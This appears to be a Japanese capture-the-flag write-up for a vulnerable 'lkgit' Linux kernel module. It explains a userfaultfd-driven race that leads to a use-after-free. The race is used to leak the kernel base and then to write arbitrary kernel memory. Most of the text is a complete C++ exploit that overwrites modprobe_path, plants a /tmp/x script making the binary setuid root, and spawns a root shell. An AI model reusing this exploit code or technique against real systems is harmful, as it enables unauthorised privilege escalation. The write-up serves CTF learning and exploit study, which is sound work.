_Author: Dronex_

カーネルモジュールの問題。ロックが無いため、複数スレッドから操作を行うことで競合状態を発生させることができる。
メモリアクセスがいい感じに行われるのでuserfaultfdで制御できる。

## leak kernel base
`lkgit_get_object`関数にある以下のコードの部分でリークできる。

```c
	if ((target_ix = find_by_hash(hash)) != -1) {
		target = objects[target_ix];
		if (copy_to_user(req->content, target->content, FILE_MAXSZ))
			goto end;

		// validity check of hash
		get_hash(target->content, hash_other);
		if (memcmp(hash, hash_other, HASH_SIZE) != 0)
			goto end;

		if (copy_to_user(req->message, target->message, MESSAGE_MAXSZ))
			goto end;
		if (copy_to_user(req->hash, target->hash, HASH_SIZE)) 
			goto end;
		ret = 0;
	}
```

最初に`target`変数にポインタが読み込まれ、その後はずっとこれを使う。そのため、hashのチェックの後で別スレッドから対象のメモリを解放させてやり、さらに適当なkernel構造体を同サイズで確保させると参照先をこれにすり替えられる。

1. req->messageに対する書き込みをuserfaultfdでトラップする。
2. 停止している間に`lkgit_hash_object`を`target`と同じhashで呼び出し、`target`を`objects`から追い出し`kfree`させる。
3. `hash_object`と同じサイズ(kmalloc-32)の適当なkernel構造体を確保する。先頭付近にkernelのaddressがあるものが必要。`shmat`を使った。
4. userfaultfdのハンドラを適切に処理し、処理を再開させる。
5. `copy_to_user(req->hash, target->hash, HASH_SIZE)`により確保したkernel構造体の先頭16バイトが読める。

## AAW
`lkgit_amend_message`も`lkgit_get_object`の時と同様にして`target`の参照先をいじることができる。

```c
	if ((target_ix = find_by_hash(req.hash)) != -1) {
		target = objects[target_ix];
		// save message temporarily
		if (copy_from_user(buf, reqptr->message, MESSAGE_MAXSZ))
			goto end;
		// return old information of object
		ret = lkgit_get_object(reqptr);
		// amend message
		memcpy(target->message, buf, MESSAGE_MAXSZ);
	}
```

1. userfualtfdを使い`copy_from_user(buf, reqptr->message, MESSAGE_MAXSZ)`で停止させる。
2. `target`を`kfree`させる。
3. 同サイズで適当な構造体を確保させる。`target->message`の部分に書き込み先のアドレスを用意するため、内容を決められる構造体が必要。`setxattr`を使った。
4. 処理を再開させる。
5. `memcpy(target->message, buf, MESSAGE_MAXSZ);`により`target->message`に`buf`、つまり`reqptr->message`の内容が書き込まれる。

kernelの`modprobe_path`を書き換えることで最終的に特権を得ることができる。

## exploit code

プログラム自身は`/tmp/exploit`に置かれていることを前提にしている。

```cpp
#define _GNU_SOURCE
#include <stdio.h>
#include <pthread.h>
#include <stdlib.h>
#include <stdint.h>
#include <stddef.h>
#include <inttypes.h>
#include <string.h>

#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/timerfd.h>
#include <sys/mman.h>
#include <sys/ioctl.h>

#include <sys/types.h>
#include <sys/xattr.h>
#include <sys/shm.h>
#include <sys/ipc.h>

#include <sys/socket.h>
#include <linux/userfaultfd.h>
#include <sys/syscall.h>
#include <poll.h>

#include "files/src/include/lkgit.h"

auto lkgit_hash_object(int fd, hash_object *req) {
    return ioctl(fd, LKGIT_HASH_OBJECT, req);
}

auto lkgit_get_object(int fd, log_object *req) {
    return ioctl(fd, LKGIT_GET_OBJECT, req);
}

auto lkgit_ammend_message(int fd, log_object *req) {
    return ioctl(fd, LKGIT_AMEND_MESSAGE, req);
}

#ifndef NDEBUG
#include <assert.h>
#define check assert
#else
static void check(bool cond) {
    if (!cond) {
        fputs("check failed", stderr);
        exit(1);
    }
}
#endif

class UFFDMemory {
    void fault_handler() {
        struct uffd_msg fault_msg = {0};
        if (read(fd, &fault_msg, sizeof(fault_msg)) != sizeof(fault_msg)) {
            fprintf(stderr, "UFFDMemory: read error\n");
            return;
        }

        if(this->on_fault) {
            if(!this->on_fault(this)) {
                this->closefd();
                return;
            }
        }

        struct uffdio_copy p = {
            .dst = fault_msg.arg.pagefault.address,
            .src = reinterpret_cast<uintptr_t>(data),
            .len = 0x1000,
        };

        ioctl(fd, UFFDIO_COPY, &p);
    }

    static void *thread_main(void *param) {
        reinterpret_cast<UFFDMemory *>(param)->fault_handler();
        return nullptr;
    }
public:    
    uintptr_t addr;
    pthread_t thread;
    int fd;

    bool (*on_fault)(UFFDMemory * self);
    char *data;
    
    UFFDMemory(void *addr_ = nullptr)
    {
        this->fd = syscall(__NR_userfaultfd, O_CLOEXEC);
        check(this->fd >= 0);
        struct uffdio_api api = {
            .api = UFFD_API,
            .features = 0
        };
        check(!ioctl(fd, UFFDIO_API, &api));
        check(api.api == UFFD_API);

        this->addr = reinterpret_cast<uintptr_t>(mmap(addr_, 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | (addr_ ? MAP_FIXED : 0), 0, 0));
        check(MAP_FAILED != (void*)addr);
        check(MAP_FAILED != (mmap((void*)(addr - 0x1000), 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED | MAP_POPULATE, 0, 0)));
        check(MAP_FAILED != (mmap((void*)(addr + 0x1000), 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED | MAP_POPULATE, 0, 0)));

        struct uffdio_register reg = {
            .range = {
                .start = addr,
                .len = 0x1000
            },
            .mode = UFFDIO_REGISTER_MODE_MISSING
        };
        
        check(!ioctl(fd, UFFDIO_REGISTER, &reg));
        check(reg.ioctls & UFFD_API_RANGE_IOCTLS);

        this->data = static_cast<char *>(malloc(0x1000));

        pthread_create(&thread, nullptr, thread_main, this);
    }

    ~UFFDMemory() {
        this->closefd();
        this->join();
        free(this->data);
        munmap((void*)(this->addr-0x1000), 0x3000);
    }

    void closefd() {
        if(this->fd != -1) {
            ::close(this->fd);
            this->fd = -1;
        }
    }

    void join() {
        pthread_join(thread, nullptr);
    }
};


uint64_t kernel_offset;
int lkgit_fd;

int main(int argc, char ** argv) {
    setbuf(stdout, NULL);
    if(argc > 1) {
        setresuid(0, 0, 0);
        return system("/bin/sh");
    }

    lkgit_fd = open("/dev/lkgit", O_RDWR);
    check(lkgit_fd >= 0);

    decltype(hash_object::hash) hash;
    {
        hash_object req;
        req.content = "AAAA";
        req.message = "BBBB";
        lkgit_hash_object(lkgit_fd, &req);
        memcpy(hash, req.hash, sizeof(req.hash));
    }

    // leak kernel base
    {
        UFFDMemory um((void*)0x10001000UL);

        um.on_fault = [](auto)
        {            
            {
                hash_object req;
                req.content = "AAAA";
                req.message = "BBBB";
                lkgit_hash_object(lkgit_fd, &req);
            }
            {
                auto id = shmget(IPC_PRIVATE, 32, IPC_CREAT | 0666);
                check(id != -1);
                check(shmat(id, 0, 0) != (void*)-1);
            }
            return true;
        };

        auto req = (log_object *)(um.addr - offsetof(log_object, message));
        memcpy(req->hash, hash, sizeof(hash));

        lkgit_get_object(lkgit_fd, req);

        uint64_t leak;
        memcpy(&leak, req->hash + 8, 8);
        kernel_offset = leak - 0xffffffff81d6e800;

        // printf("[+] kernel_base: %p\n", kernel_offset);
    }

    // overwrite modprobe_path
    {
        UFFDMemory um((void*)0x10001000UL);
        um.on_fault = [](auto)
        {
            {
                hash_object req;
                req.content = "AAAA";
                req.message = "BBBB";
                lkgit_hash_object(lkgit_fd, &req);
            }
            {
                char mem[0x20];
                memset(mem, 0xFF, sizeof(mem));
                uint64_t target = kernel_offset + 0xffffffff81c3cb20UL;
                memcpy(mem + 0x18, &target, 8);

                setxattr("/dev/null", "attr", mem, 0x20, 0);
            }
            return true;
        };

        auto req = (log_object *)(um.addr - offsetof(log_object, message));
        const char new_modprobe_path[] = "/tmp/x";
        memcpy(um.data, new_modprobe_path, sizeof(new_modprobe_path));
        memcpy(req->hash, hash, sizeof(hash));

        lkgit_ammend_message(lkgit_fd, req);
    }


    system(R"(echo -ne "#!/bin/sh\nchown 0 /tmp/exploit \nchmod 4777 /tmp/exploit" > /tmp/x)");
    system(R"(echo -ne '\xff\xff\xff\xff' > /tmp/d)");
    system("chmod +x /tmp/x");
    system("chmod +x /tmp/d");
    system("/tmp/d");
    system("/tmp/exploit 1");
}
```